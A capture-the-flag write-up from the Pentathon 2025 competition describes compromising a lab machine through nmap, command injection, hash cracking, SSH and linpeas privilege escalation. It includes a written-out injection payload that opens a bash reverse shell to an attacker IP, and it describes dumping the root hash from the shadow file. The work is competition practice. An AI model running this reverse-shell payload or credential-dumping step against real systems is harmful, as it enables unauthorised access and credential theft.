<p align="center">NCIIPC-AICTE

<p align="center">Pentathon 2025

  

<p align="center">Vulnerability Assessment and Penetration Test Report

  

<p align="center">May 03, 2025

<p align="center">Name: Jay Shah

<p align="center">jayshah-551-SLI13</p>

  <br>

Running Nmap on the IP

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfyMz3LgAzRLfyyyEiYDJ3vOlrJVjE7MuE-6v6r_ikflLibn_MMemaBDdIxAVGUjYz5vEHgEAKMP9iMWR6QzWDeK7-YElEJ6Dije4MhUGtBsDyWw24dIYZjzjuVQUS8BWAcSuQc?key=iX2Q4IQw_jo7FDnLZh141RI6)

Website has this -

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXe4Alkpds5ebTWS2j99KGiENSwjSAUXWjawl8tidQhWY2N5ZYIdNB8wsI18nMZoagDSib2AU-H-0RtH8i5ZLeEYbn2UbCLteeyUUtF79xIqvgM3c6l5yZM-b-8BQJebewT8To59?key=iX2Q4IQw_jo7FDnLZh141RI6)

I instantly figure that it is one of those cmd injection ones, and try -

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcNy-B0rccRKtt-o90MafWcSvqfRkEobR0c2BnqHeegv0UQqC_h0aX6_HRKQwupm7GD_74QchubYB4VgDSGLRjFTomKpszm1yx5cemdns-bOgoH_HkPlswbomhd9Uomirp7MNB0TQ?key=iX2Q4IQw_jo7FDnLZh141RI6)

And -

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfShaf_l7Dsr471D_SOVqV6mHTc_48nBmj0nJybEYU4lFy8HCf8Ck6SjDbPORxURKRBVq9L1HgbfBy704JpNCOPFLw0ptROJZVtC7CU05gx0wAhGq-L_LeC3CN2dvza0c5MpQNgHQ?key=iX2Q4IQw_jo7FDnLZh141RI6)

Ok this time I need to be the user to see the user flag -

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfYsurl2Y3DUep_KNl94E3OuLIyu-z_SRofmHPw5q3ivD_SnRdYXsKGbaZxMuDgKZnhWTpTht49e-9_kx25TcOgQnWSxe-DHxfjdChfElRiihaAM_kVFkr6v4UH-1CNCoF7Hrs6rg?key=iX2Q4IQw_jo7FDnLZh141RI6)

This payload works as a web shell -

127.0.0.1; bash -c 'bash -i >& /dev/tcp/192.168.230.132/9001 0>&1'

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcxRLdtdP7MLG0mv5OnZSLE4V3maBnpKpTl9KXbTmG4s23EiVcPPSAPJQPwLxDrp1s9q_AHwtpVx2nNTxK-gCaLYm-Q3sCYIzDMXoZSpgXQ7f8PyfVeBmKzSp-ZQVzbATfz8BvN3g?key=iX2Q4IQw_jo7FDnLZh141RI6)

We see a users.db which is interesting -

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXebK7v67jmn-G__8rXtV9tBL_brWmfpDtLLrmbQvXW0JVjm9AtEtLyYZmbz9duIRCsNPq6ec3_FNPA74YoaOJkrKNlSIEFOlnmQsWVnExlk-dOKPS5T0n5sg7j-sBb7advZCUdyew?key=iX2Q4IQw_jo7FDnLZh141RI6)

And the hash is cracked from Traboda's site -

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcdHAIeCSihzIuMoQsFBJgwIdXKWYHIkNYZS_kOjBBrotCfBNLHcIq86yiqgwhffO6I9hO4EWNc4_1RoJJJ4z8qqCM2KaLDibqPF_Z0pBvTLogsUJPp22024YJVOb_T6W45i7276A?key=iX2Q4IQw_jo7FDnLZh141RI6)

Since we saw ssh running on port 22 in the nmap scan,

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXefTNGw6yu9mv4xqZD-1RPF5GNGG70CDo-RnDfVkO5C1IAyHmPmnwKprcS9DeksvbAgi76g6ch31LYwLGxHn5k1upnugcS1_ClfkveInja6x4APKPv5Vs72XCE00-7rMUExeod0Og?key=iX2Q4IQw_jo7FDnLZh141RI6)

And we get the user flag.txt -

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXd9c3ms98qRVYN1p4Uzrd-byhtMj4X4ppvFhvNIrMUJLzTfrHM6qOaIYpIvAH_tbM9aQE9Kg9t9jGBC2MoT2B-ZTp00EaHN_t-hXStJMNitRpww2YCzP88ZpZYpoS_tlyIbENF0?key=iX2Q4IQw_jo7FDnLZh141RI6)

Running linpeas on it gives a very interesting file -

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdo5xNbpsKIWtCkKyno8FkHsGZJj7Fq8rBCT-RZ4-qeinTy9vTfKsGd9lj3rEXoRs5BkJORowRgcQQ1CNycR6K6jw23yPhYF-QTfkjjj-QhZMWvc13H0gXyO3tKk_xm2loqHMP0?key=iX2Q4IQw_jo7FDnLZh141RI6)

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeaeGONvuq0BouO0HuwSbCYBN1PnNtEyHcXkmVT1n-jWsuJae_y1VzEMxUN-PRgOsx6AyydewxZMANulzMjFMNoXNSF0QPyhMPZBUc1t2I7MN3o-iOQkjYuso_--2ZMNbSyUFw17A?key=iX2Q4IQw_jo7FDnLZh141RI6)

And now we can create a backup of the shadow file and dump the root hash -

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdYEJQftakxP8o2tV_LPI4bajT05U1F7_k-2i9WVpqBzsUU0L6UB_Uus6EBtf2o-YqNY21gu3Cr2VYhI8sZ9Xaf0K8AXO-PRE260v-wVjssAauH6BzgVIgR0-tQrCp2GEfxBikkSw?key=iX2Q4IQw_jo7FDnLZh141RI6)

And the same way we can get the root flag too -

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeMOFa1ssQqPsvzWz8CcOmlE2B8GDcuTyOE4dVMx5RJ0xgjhkmw21RRcyDdzp-zK9pNsxoZWIPsaHiQSNaYY4ceQMMCJYHm2sTNdpJwJy8nrPF8wUPRY-yUOBCLQ3nfamPSAqHX?key=iX2Q4IQw_jo7FDnLZh141RI6)
